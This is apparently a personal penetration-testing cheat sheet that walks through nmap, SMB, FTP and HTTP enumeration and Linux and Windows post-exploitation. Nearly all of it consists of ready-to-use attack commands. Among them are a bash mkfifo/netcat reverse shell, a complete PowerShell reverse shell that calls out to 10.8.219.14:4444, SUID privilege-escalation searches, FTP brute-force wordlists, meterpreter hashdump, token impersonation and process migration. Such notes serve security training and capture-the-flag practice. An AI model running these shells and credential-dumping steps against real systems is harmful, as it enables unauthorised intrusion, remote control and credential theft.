# Enumeration

Documenting different ways to uncover ways to gain intial access and exploiting them.

## Table of Contents

- [NMAP](#NMAP)
- [SMB](#SMB)
- [FTP](#FTP)
- [HTTP](#HTTP)

---------------------------------------------------------------------------

# NMAP

As an alternative you can use `rustscan -a <address>`

Normal scan: `nmap -vv -sV -Pn -A -T4 --script vuln <address>`
Long scan: `nmap -sV -Pn -A -T4 -p- <address>`

---------------------------------------------------------------------------

# SMB

## Initial Access

`smbmap -H <address>`
Check discovered directories in other places such as websites.
`smbclient -L <address> -U`
List all the directories in the share
Enumerate SMB via NMAP: `nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <address>`

---------------------------------------------------------------------------

# FTP

## Initial Access

### Anonymous Login

`ftp <address>`
login: anonymous (no password required)

### NMAP Scripts

`nmap --script ftp-* -p 21 <address>`

## Brute Force

[ftp-betterdefaultpasslist](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt)

## Investigation

### Download all files

`wget -m ftp://anonymous:anonymous@<address>`
`wget -m --no-passive ftp://anonymous:anonymous@<address>`

---------------------------------------------------------------------------

# HTTP

## Initial Access

### Directory Discovery

GoBuster: `gobuster dirb --url=<address> --wordlist=<wordlist>`
After running go buster manually explore some interesting directories, such as robots.txt.

### Password Discovery

If you are having trouble brute-forcing a password for a blog, try creating a custom wordlist with cewl:
`cewl -d 3 -m 7 -w <wordlist to export> <http://address.com>`

### Reverse Shells

See [Reverse Shells](/exploitation/reverse_shells) for more information.

---------------------------------------------------------------------------

## Post-Exploitation

### Check Services and Ports
Running Ports: `ss -natu`
Forwarding ports through ssh: `ssh -L <local port>:<remote address>:<remote port> <username>@<address>`

### Python
#### Reverse Shell Upgrade
`python -c 'import pty; pty.spawn("/bin/bash")'`

#### Simple HTTP Server
If you need to get a file over to a compromised server with curl installed:
`python3 -m http.server`

### Shell
#### SUID search
`find / -user root -perm -4000 -exec ls -ldb {} \;`
`find / -perm -u=s -type f 2>/dev/null`
BEST: `find / -perm -u=s -type f 2>/dev/null; find / -perm -4000 -o- -perm -2000 -o- -perm -6000 2>/dev/null`

If you find a binary that matches this, you can try running with the `-p` flag which allows you to run a binary as the owner.

EXAMPLE USES:
nmap -i
find <folder> -exec <command> \;

## Sneaky Reverse Shell Bash
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 127.0.0.1 4444 >/tmp/f
```

#### Find writable directories
`find -type d -writable`

#### Windows Migration
get a meterpreter session and find a process running as SYSTEM: `ps`
safest choice is to choose `services.exe`
`migrate <process id>`

#### Windows Passwords
within meterpreter session: `hashdump`

#### Using Powershell
`load powershell` then `powershell_shell`

#### Windows Token Exploitation
powershell `whoami /priv`
msf `load incognito`
`list_tokens -g` then `impersonate_token <name of token>`

## Tools
A series of a userful links:
- [Nishang](https://github.com/samratashok/nishang.git): A series of useful Windows Exploit scripts
- [PowerSploit](https://github.com/PowerShellMafia/PowerSploit) Same as above

### Powershell Reverse Shell
`powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.8.219.14',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`

### Starting SMB Server
Navigate to folder to share

`python3 /usr/share/doc/impacket-scripts/examples/smbserver.py SHARE .`

### Starting FTP Server
Install `sudo apt-get install python3-pyftpdlib`

`python3 -m pyftpdlib -p 21`

### Powershell

- Search for command with name: `Get-Command *search_parameter*`
- Get all Parameters for a command: `(Get-Command Command).Parameters`
- Search for a file: `Get-ChildItem -Path C:\ -Include *title* -File -Recurse -ErrorAction SilentlyContinue`
- Search for files containing string: `Get-ChildItem C:\* -Recurse | Select-String -pattern search_string`
- Get list of running processes: `Get-Process`
